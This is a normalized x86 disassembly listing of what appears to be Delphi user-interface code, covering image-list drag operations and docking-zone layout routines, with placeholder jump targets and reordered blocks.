call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_454b50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_459fe0
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_45a1b4
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_454bb0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45ae90
mov eax ebx
call sub_459fe0
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_454bdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_459fe0
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_454a84
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_454c3c
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_454b50
push 0x0
call ShowCursor
sub_454c3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_459fe0
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_454ca0
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_454a2c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_454ca0
push ebx
mov ebx eax
mov eax ebx
call sub_459fe0
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_454cc4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_459fe0
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_454a2c
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_454d38
push ebx
push esi
mov esi eax
mov eax esi
call sub_459fe0
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_454ca0
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_454b98
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_454d80
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44edd8
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e50
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_44b428
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_454ddc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44ef08
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_454e2c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_425154
xor eax eax
push ebp
push sub_454eca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_4255f0
xor eax eax
push ebp
push sub_454ea7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44b440
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454eae
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_4255f0
retn
sub_454edc
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_454f70
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_454ef8
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_454f70
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_455568
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_454f70
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_454fa4
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_455034
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
mov edx 0x2
call sub_455034
jmp r-xdata
retn
sub_454fec
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4550a0
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
mov edx 0x2
call sub_4550a0
jmp r-xdata
retn
sub_455034
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_455468
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_4550a0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_454f54
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_455468
push eax
mov eax esi
call sub_454fa4
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_455468
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_455150
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_454f54
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_455568
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_4550a0
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_454f54
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_4550a0
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_454fa4
mov edx eax
add edx esi
mov eax ebx
call sub_455490
mov edx edi
mov eax ebx
call sub_455490
jmp r-xdata
mov eax ebx
call sub_4552f0
mov eax ebx
call sub_455540
mov ebx eax
test ebx ebx
jne r-xdata
sub_4551f8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404038
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_40408c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
sub_45523c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_4034a4
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_4552ad
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_44d5c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_4552c0
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_455540
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_4552f0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4550a0
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4550a0
mov esi eax
push ebp
call sub_4552c0
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_455540
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_455034
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_455034
mov ecx ebx
pop edx
call sub_4172c0
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44c234
mov eax [ ebp - 0x4 ]
call sub_455468
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_455468
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_455468
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_455468
push ebx
mov ebx eax
mov eax ebx
call sub_454f70
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_454ef8
test al al
je r-xdata
mov eax ebx
call sub_454fa4
pop ebx
retn
sub_4554a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_455490
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_454f40
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_455494
mov edx esi
call sub_4554a4
sub_4554e0
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_455468
mov edi eax
mov eax ebx
call sub_454fa4
cmp edi eax
jl r-xdata
mov eax esi
call sub_455150
mov eax [ esi + 0x1c ]
push eax
push sub_456ff0
mov edx esi
call sub_45581c
mov eax ebx
call sub_455468
mov edi eax
mov eax esi
call sub_454fec
cmp edi eax
jle r-xdata
mov eax ebx
call sub_4554e0
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_45554c
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_454f70
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_455574
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403278
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_40360c
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_454f1c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424ac8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42bc8c
mov edx eax
mov eax ebx
call sub_424c44
mov eax [ ebp - 0x4 ]
call sub_455744
xor eax eax
push ebp
push sub_455680
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44fde8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_455150
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455687
mov eax [ ebp - 0x4 ]
call sub_455748
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_44fdac
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_455687
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_457518
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4556dc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_456748
mov eax [ esi + 0x10 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_45575c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_45575c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_45575c
pop ecx
sub_4557b4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_45575c
pop ecx
sub_4557e0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4557e0
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4557e0
pop ecx
sub_455834
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_4557b4
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4550a0
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_4550a0
push eax
mov edx 0x1
mov eax ebx
call sub_455034
push eax
mov edx 0x2
mov eax ebx
call sub_455034
pop edx
pop ecx
call sub_4172c0
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402cbc
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4558b8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_4552f0
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_4172c0
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44c234
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_454f1c
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4557b4
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_454f40
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_4567e0
mov edx esi
mov eax ebx
call sub_4557b4
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_44c818
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_454f1c
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_44c804
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_4550a0
mov edx eax
mov eax edi
call sub_455490
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_4550a0
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_4550a0
mov edx eax
mov eax edi
call sub_455490
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_4550a0
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_455ac8
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_455c70
jmp r-xdata
sub_455ac8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_454f1c
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_455468
mov edx eax
mov eax ebx
call sub_455490
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_455490
mov eax [ esi + 0x64 ]
call sub_455468
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_456b38
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_45581c
mov eax [ esi + 0x64 ]
call sub_455468
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
